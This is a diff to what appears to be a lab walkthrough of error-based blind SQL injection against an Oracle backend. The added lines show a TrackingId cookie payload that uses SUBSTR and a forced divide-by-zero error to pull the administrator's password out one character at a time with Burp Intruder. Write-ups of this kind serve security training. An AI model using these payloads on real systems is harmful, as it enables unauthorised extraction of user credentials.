@@ -69,3 +69,9 @@ TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM user
 TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
 ```
 - and iterate the process till we got 20 on 21 no error displays which means the password is shorter than 21
+- now to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder.
+- In the Positions tab of Burp Intruder, change the value of the cookie to
+```
+TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+```
+- SUBSTR() function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn
